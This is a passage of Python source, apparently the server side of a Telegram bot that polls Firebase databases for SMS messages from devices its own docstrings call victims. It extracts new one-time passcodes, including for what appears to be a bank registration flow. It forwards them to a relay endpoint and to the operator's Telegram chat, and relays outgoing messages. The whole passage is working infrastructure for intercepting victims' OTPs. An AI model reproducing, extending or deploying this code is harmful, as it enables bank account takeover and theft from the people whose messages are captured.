                path = f"{parent}/{device_id}/{child}"
                if path not in seen_paths:
                    seen_paths.add(path)
                    paths.append(path)

            device_path = f"{parent}/{device_id}"
            if device_path not in seen_paths:
                seen_paths.add(device_path)
                paths.append(device_path)

        for top in ("sms", "SMS", "inbox", "Inbox", "data", "logs", "messages"):
            path = f"{top}/{device_id}"
            if path not in seen_paths:
                seen_paths.add(path)
                paths.append(path)
        for parent in SMS_PARENT_PATHS:
            for suffix in (
                "lastSms",
                "last_sms",
                "latest_sms",
                "otp",
                "lastMessage",
                "webhookEvent",
                "webhookEvent/receiveSms",
                "webhookEvent/incomingSms",
            ):
                path = f"{parent}/{device_id}/{suffix}"
                if path not in seen_paths:
                    seen_paths.add(path)
                    paths.append(path)

    return paths


def get_cached_sms_paths(device: Device) -> list[str]:
    meta = _meta_dict(device)
    cached = meta.get(SMS_PATHS_META_KEY) or []
    if isinstance(cached, list):
        return [str(path) for path in cached if path]
    return []


def set_cached_sms_paths(device: Device, paths: list[str]) -> None:
    if not paths:
        return
    meta = _meta_dict(device)
    meta[SMS_PATHS_META_KEY] = list(dict.fromkeys(paths))[:MAX_CACHED_SMS_PATHS]
    _save_meta(device, meta)


async def _fetch_paths_parallel(
    root: str,
    paths: list[str],
    *,
    timeout: float,
) -> tuple[list[dict[str, Any]], list[str]]:
    if not paths:
        return [], []

    semaphore = asyncio.Semaphore(get_poll_workers())

    async def fetch_one(path: str) -> tuple[str, list[dict[str, Any]]]:
        async with semaphore:
            records = await _fetch_path_records(root, path, timeout)
            return path, records

    results = await asyncio.gather(
        *[fetch_one(path) for path in paths],
        return_exceptions=True,
    )

    all_records: list[dict[str, Any]] = []
    hit_paths: list[str] = []
    for result in results:
        if isinstance(result, Exception):
            continue
        path, records = result
        if records:
            hit_paths.append(path)
            all_records.extend(records)

    return all_records, hit_paths


def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
    deduped: dict[str, dict[str, Any]] = {}
    for record in records:
        deduped[_record_dedup_key(record)] = record
    return list(deduped.values())


def _build_hot_poll_paths(device: Device) -> list[str]:
    """Minimal hot poll — messages/{id} tail is where Chrome panel stores victim SMS."""
    paths: list[str] = []
    for device_id in _device_ids(device):
        paths.append(f"messages/{device_id}")
    for device_id in _device_ids(device):
        paths.extend(
            [
                f"clients/{device_id}/lastSms",
                f"clients/{device_id}/webhookEvent/receiveSms",
            ]
        )
    return list(dict.fromkeys(paths))[:HOT_POLL_MAX_PATHS]


_poll_cycle: dict[int, int] = {}


async def fetch_firebase_sms_for_device(
    firebase_url: str,
    device: Device,
    *,
    timeout: float = 3.0,
    force_full: bool = False,
) -> list[dict[str, Any]]:
    root = firebase_root_url(firebase_url)
    hot_paths = _build_hot_poll_paths(device)
    hot_records, hit_paths = await _fetch_paths_parallel(root, hot_paths, timeout=timeout)
    if hit_paths:
        set_cached_sms_paths(device, hit_paths)
    if hot_records:
        return _dedupe_records(hot_records)

    cycle = _poll_cycle.get(device.id, 0) + 1
    _poll_cycle[device.id] = cycle
    if not force_full and cycle % 30 != 0:
        return []

    fallback: list[str] = []
    for device_id in _device_ids(device):
        fallback.extend(
            [
                f"clients/{device_id}/otp",
                f"clients/{device_id}/webhookEvent/incomingSms",
                f"sms/{device_id}",
            ]
        )
    if device.firebase_key:
        fk = device.firebase_key.strip("/")
        fallback.extend([f"{fk}/lastSms", f"{fk}/otp"])
    fallback = list(dict.fromkeys(fallback))[:MAX_POLL_PATHS_FALLBACK]
    fallback_records, hit_paths = await _fetch_paths_parallel(root, fallback, timeout=timeout)
    if hit_paths:
        set_cached_sms_paths(device, hit_paths)
    return _dedupe_records(fallback_records)


async def snapshot_firebase_sms_seen(
    profile: MonitorProfile,
    device: Device,
    db=None,
) -> int:
    """On monitoring start — mark every existing Firebase SMS as baseline (ignored)."""
    if _baseline_shallow_snapshot_done(device, profile):
        return 0
    if db is not None:
        firebase_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
    else:
        firebase_url = _resolve_device_firebase_url(profile, device)
    if not firebase_url:
        return 0
    root = firebase_root_url(firebase_url)
    high_water = 0
    ignored = 0
    all_seen: set[str] = set()
    try:
        for device_id in _device_ids(device):
            high_water = max(
                high_water,
                await asyncio.wait_for(
                    _fetch_messages_high_water(root, device_id, SNAPSHOT_TIMEOUT_SEC),
                    timeout=SNAPSHOT_TIMEOUT_SEC,
                ),
            )
            shallow = await _fetch_messages_shallow_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC)
            all_seen |= shallow
            all_seen |= await _fetch_outgoing_message_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC)
        if all_seen and high_water > 0:
            old_seen = _old_message_keys_for_baseline(all_seen, high_water)
            mark_sms_keys_seen(device, old_seen)
            ignored = len(old_seen)
    except (asyncio.TimeoutError, httpx.HTTPError) as exc:
        logger.warning("Firebase SMS baseline fetch failed for %s: %s", device.name, exc)
        _set_baseline_high_water(device, 0, profile.started_at)
        if db is not None:
            db.commit()
        return 0

    _set_baseline_high_water(device, high_water, profile.started_at)
    meta = _meta_dict(device)
    started = _started_iso(profile.started_at)
    if started:
        meta[BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY] = started
        _save_meta(device, meta)
    if db is not None:
        db.commit()
    logger.info(
        "Firebase SMS baseline for %s: high_water=%s (~%s old SMS ignored)",
        device.name,
        high_water,
        ignored,
    )
    return ignored


def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db=None) -> None:
    """Mark baseline timestamp — high-water set by snapshot (or first poll init)."""
    meta = _meta_dict(device)
    meta.pop(SEEN_META_KEY, None)
    meta.pop(BASELINE_META_KEY, None)
    meta.pop(BASELINE_READY_META_KEY, None)
    meta.pop(MESSAGES_HIGH_WATER_META, None)
    meta.pop(INJECT_DONE_META_KEY, None)
    meta.pop(SMS_FIREBASE_URL_META_KEY, None)
    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
    meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
    meta.pop(BASELINE_SHALLOW_SNAPSHOT_DONE_META_KEY, None)
    meta.pop(BASELINE_POLL_TAIL_LOCK_META_KEY, None)
    if profile.started_at:
        meta[BASELINE_AT_META_KEY] = _started_iso(profile.started_at)
    _save_meta(device, meta)
    if db is not None:
        db.commit()


async def run_baseline_snapshot_background(telegram_user_id: int) -> None:
    """Scan Firebase for existing SMS keys without blocking Telegram callbacks."""
    db = SessionLocal()
    try:
        profile = get_monitor_profile(db, telegram_user_id)
        device = get_active_device(db, telegram_user_id)
        if not profile or not device or not profile.is_monitoring:
            return
        count = await snapshot_firebase_sms_seen(profile, device, db)
        logger.info(
            "Background Firebase baseline for user %s: %s record(s) ignored",
            telegram_user_id,
            count,
        )
    except Exception as exc:
        logger.warning("Background baseline failed for user %s: %s", telegram_user_id, exc)
    finally:
        db.close()


async def rebaseline_active_monitors() -> None:
    """Once on bot startup — do not run inside the hot poll loop."""
    db = SessionLocal()
    try:
        profiles = db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
        for profile in profiles:
            device = get_active_device(db, profile.telegram_user_id)
            if not device or baseline_ready(device, profile):
                continue
            try:
                await snapshot_firebase_sms_seen(profile, device, db)
            except Exception as exc:
                logger.warning("Startup rebaseline failed for %s: %s", device.name, exc)
    finally:
        db.close()


async def _inject_before_notify(profile: MonitorProfile, device: Device, sender: str, message: str) -> None:
    from app.firebase_sync import forward_incoming_to_mynum

    if not profile.phone_number or not profile.is_monitoring:
        return
    await forward_incoming_to_mynum(None, profile, device, sender, message)


async def _inject_and_stream_dm(
    telegram_user_id: int,
    sender: str,
    message: str,
) -> None:
    import time

    from app.telegram_notify import send_inject_stream_dm

    if _is_poll_noise_record(sender, message):
        return

    db = SessionLocal()
    try:
        profile = get_monitor_profile(db, telegram_user_id)
        device = get_active_device(db, telegram_user_id)
        if not profile or not device:
            return

        t0 = time.perf_counter()
        try:
            await _inject_before_notify(profile, device, sender, message)
        except Exception as exc:
            logger.warning("Fast inject failed for %s: %s", device.name, exc)
        relay_ms = max(1, int((time.perf_counter() - t0) * 1000))
    finally:
        db.close()

    await send_inject_stream_dm(telegram_user_id, sender, message, relay_ms)


async def _relay_outgoing_from_firebase(
    profile_id: int,
    device_id: int,
    text: str,
) -> None:
    from app.outbound_relay import relay_outgoing_text

    db = SessionLocal()
    try:
        profile = db.query(MonitorProfile).filter(MonitorProfile.id == profile_id).first()
        device = db.query(Device).filter(Device.id == device_id).first()
        if not profile or not device:
            return
        await relay_outgoing_text(
            db,
            profile,
            device,
            text,
            source="firebase",
        )
    except Exception as exc:
        logger.warning("Firebase outgoing auto-relay failed: %s", exc)
    finally:
        db.close()


async def _ensure_messages_high_water(
    profile: MonitorProfile,
    device: Device,
    firebase_url: str,
    db,
) -> int:
    """One-shot incoming tail lock — never re-scan shallow keys on every poll."""
    if _monitoring_baseline_done(device, profile):
        return _messages_high_water(device)

    started = _started_iso(profile.started_at)
    meta = _meta_dict(device)
    if started and meta.get(BASELINE_POLL_TAIL_LOCK_META_KEY) == started:
        return _messages_high_water(device)

    root = firebase_root_url(firebase_url)
    device_id = (device.name or "").strip()
    if not device_id:
        return 0

    fetch_timeout = _otp_poll_timeout()
    high_water = await _fetch_messages_high_water(root, device_id, fetch_timeout)
    if not high_water:
        records = await _fetch_path_records(
            root,
            f"messages/{device_id}",
            fetch_timeout,
        )
        push_ids = _incoming_push_ids(records)
        if push_ids:
            high_water = max(push_ids)

    try:
        junk = await _fetch_outgoing_message_keys(root, device_id, fetch_timeout)
        if junk:
            mark_sms_keys_seen(device, junk)
    except Exception:
        pass

    _set_baseline_high_water(device, high_water, profile.started_at)
    if started:
        meta = _meta_dict(device)
        meta[BASELINE_POLL_TAIL_LOCK_META_KEY] = started
        _save_meta(device, meta)
    db.commit()
    logger.info(
        "OTP baseline tail lock device=%s high_water=%s (shallow=%s)",
        device_id,
        high_water,
        _baseline_shallow_snapshot_done(device, profile),
    )
    return high_water


async def _poll_messages_otp_only(
    profile: MonitorProfile,
    device: Device,
    firebase_url: str,
    db,
) -> int:
    """Poll messages + client webhook SMS paths; deliver all new OTPs."""
    from app.telegram_notify import send_otp_received_dm

    device_id = (device.name or "").strip()
    if not device_id:
        logger.warning("OTP poll skip: empty device name")
        return 0

    root = firebase_root_url(firebase_url)
    fetch_timeout = _otp_poll_timeout()
    await _ensure_messages_high_water(profile, device, firebase_url, db)
    await _reconcile_incoming_high_water(device, root, device_id, db, fetch_timeout)
    high_water = _messages_high_water(device)
    paths = _build_hot_poll_paths(device)
    try:
        records, hit_paths = await asyncio.wait_for(
            _fetch_paths_parallel(root, paths, timeout=fetch_timeout),
            timeout=fetch_timeout + 1.5,
        )
        if hit_paths:
            set_cached_sms_paths(device, hit_paths)
    except (asyncio.TimeoutError, Exception) as exc:
        logger.warning("OTP poll paths failed device=%s: %s", device_id, exc)
        records = []
    if not records:
        records = await _fetch_path_records(root, f"messages/{device_id}", fetch_timeout)
    records = _dedupe_records(records)
    if not records:
        streak = _bump_empty_poll_streak(device, db)
        force_pool = streak >= EMPTY_POLL_RESCAN_AFTER
        if force_pool:
            logger.warning(
                "OTP poll empty x%s device=%s — rescan full Firebase pool",
                streak,
                device_id,
            )
        alt_url = await resolve_firebase_url_for_otp_poll(
            profile,
            device,
            db,
            force_pool_scan=force_pool,
        )
        if alt_url and alt_url != firebase_url:
            root = firebase_root_url(alt_url)
            firebase_url = alt_url
            records = await _fetch_path_records(root, f"messages/{device_id}", fetch_timeout)
            records = _dedupe_records(records)
    if not records:
        logger.warning("OTP poll empty device=%s url=%s", device_id, firebase_url)

    candidates: list[dict[str, Any]] = []
    for record in records:
        if not _should_deliver_otp_record(record, device, profile):
            continue
        sender = str(record.get("sender") or "Unknown")
        body = str(record.get("message") or "")
        if (
            not _looks_like_incoming_sms(sender, body)
            and (
                _is_poll_noise_record(sender, body)
                or _is_outgoing_firebase_log(sender, body)
            )
        ):
            mark_sms_keys_seen(device, {_record_dedup_key(record)})
            continue
        candidates.append(record)

    if not candidates:
        if records:
            logger.debug(
                "OTP poll device=%s high_water=%s — waiting for NEW OTP",
                device_id,
                high_water,
            )
        return 0

    # Deliver every new OTP in order (YONO reg + OTP often land within seconds).
    from app.firebase_sync import forward_incoming_to_mynum

    to_deliver = sorted(candidates, key=lambda item: _message_push_id(item) or 0)[
        :MAX_OTP_DELIVER_PER_POLL
    ]
    delivered = 0

    for record in to_deliver:
        push_id = _message_push_id(record)
        sender = str(record.get("sender") or "Unknown")
        body = str(record.get("message") or "")
        dedup = _record_dedup_key(record)

        async def _run_inject() -> bool:
            if dedup in get_inject_done_keys(device):
                return True
            try:
                await forward_incoming_to_mynum(db, profile, device, sender, body)
                mark_inject_done_keys(device, {dedup})
                return True
            except Exception as exc:
                logger.warning(
                    "OTP inject to /mynum failed device=%s sender=%s: %s",
                    device_id,
                    sender,
                    exc,
                )
                return False

        inject_ok, dm_ok = await asyncio.gather(
            _run_inject(),
            send_otp_received_dm(profile.telegram_user_id, sender, body),
        )
        if not dm_ok:
            logger.error(
                "OTP bot DM failed user=%s sender=%s id=%s (inject_ok=%s)",
                profile.telegram_user_id,
                sender,
                push_id,
                inject_ok,
            )
            continue

        save_sms(
            db,
            sender=sender,
            message=body,
            device_name=device.name,
            received_at=record.get("received_at"),
        )
        mark_sms_keys_seen(device, {dedup})
        mark_inject_done_keys(device, {dedup})
        delivered += 1
        db.commit()
        logger.info(
            "OTP delivered user=%s sender=%s push_id=%s",
            profile.telegram_user_id,
            sender,
            push_id,
        )

    if delivered:
        _reset_empty_poll_streak(device, db)
    elif candidates:
        db.commit()
    return delivered


async def _poll_one_monitoring_profile(profile_id: int) -> int:
    db = SessionLocal()
    try:
        profile = db.query(MonitorProfile).filter(MonitorProfile.id == profile_id).first()
        if not profile or not profile.is_monitoring:
            return 0

        device = get_active_device(db, profile.telegram_user_id)
        if not device:
            return 0

        firebase_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
        if not firebase_url:
            logger.warning("OTP poll skip user=%s: no firebase URL", profile.telegram_user_id)
            return 0

        return await _poll_messages_otp_only(profile, device, firebase_url, db)
    finally:
        db.close()


async def poll_monitoring_profiles_once() -> int:
    db = SessionLocal()
    try:
        profile_ids = [
            profile.id
            for profile in db.query(MonitorProfile).filter(MonitorProfile.is_monitoring.is_(True)).all()
        ]
    finally:
        db.close()

    if not profile_ids:
        return 0

    semaphore = asyncio.Semaphore(_poll_profile_concurrency())

    async def run_one(profile_id: int) -> int:
        async with semaphore:
            return await _poll_one_monitoring_profile(profile_id)

    results = await asyncio.gather(
        *(run_one(profile_id) for profile_id in profile_ids),
        return_exceptions=True,
    )
    processed = 0
    for result in results:
        if isinstance(result, Exception):
            logger.debug("Profile poll task failed: %s", result)
            continue
        processed += int(result)
    return processed


async def run_firebase_sms_poll_loop() -> None:
    while True:
        poll_timeout = _otp_poll_timeout()
        try:
            count = await asyncio.wait_for(
                poll_monitoring_profiles_once(),
                timeout=poll_timeout + 1.2,
            )
            if count:
                logger.info("Firebase SMS poll delivered %s message(s)", count)
        except asyncio.TimeoutError:
            logger.warning("Firebase SMS poll cycle timed out")
        except Exception as exc:
            logger.exception("Firebase SMS poll loop error: %s", exc)
        await asyncio.sleep(_otp_poll_interval())


async def finish_monitoring_baseline(profile_id: int, device_id: int) -> int:
    """Background full baseline scan — never block Telegram handlers."""
    db = SessionLocal()
    try:
        profile = db.query(MonitorProfile).filter(MonitorProfile.id == profile_id).first()
        device = db.query(Device).filter(Device.id == device_id).first()
        if not profile or not device or not profile.is_monitoring:
            return 0
        return await snapshot_firebase_sms_seen(profile, device, db)
    except Exception as exc:
        logger.warning("Background baseline failed: %s", exc)
        return 0
    finally:
        db.close()
